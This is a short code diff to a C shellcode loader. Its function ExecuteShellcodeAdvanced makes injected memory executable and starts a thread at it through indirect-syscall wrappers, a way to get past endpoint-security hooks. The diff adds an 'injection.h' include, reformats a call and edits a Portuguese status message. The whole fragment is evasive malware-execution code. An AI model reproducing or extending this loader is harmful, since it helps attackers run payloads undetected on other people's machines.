@@ -1,3 +1,4 @@
+#include "injection.h"
 #include "syscalls.h"
 #include <stdio.h>
 
@@ -20,11 +21,10 @@ void ExecuteShellcodeAdvanced(PBYTE shellcode, SIZE_T size) {
     NtProtectVirtualMemory_Indirect(hProcess, &baseAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
 
     HANDLE hThread = NULL;
-    NtCreateThreadEx_Indirect(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
-                              baseAddr, NULL, FALSE, 0, 0, 0, NULL);
+    NtCreateThreadEx_Indirect(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, baseAddr, NULL, FALSE, 0, 0, 0, NULL);
 
     if (hThread) {
-        printf("[+] Shellcode injetado e executado via indirect syscalls!\n");
+        printf("[+] Shellcode executado via indirect syscalls!\n");
         WaitForSingleObject(hThread, 8000);
     }
 }
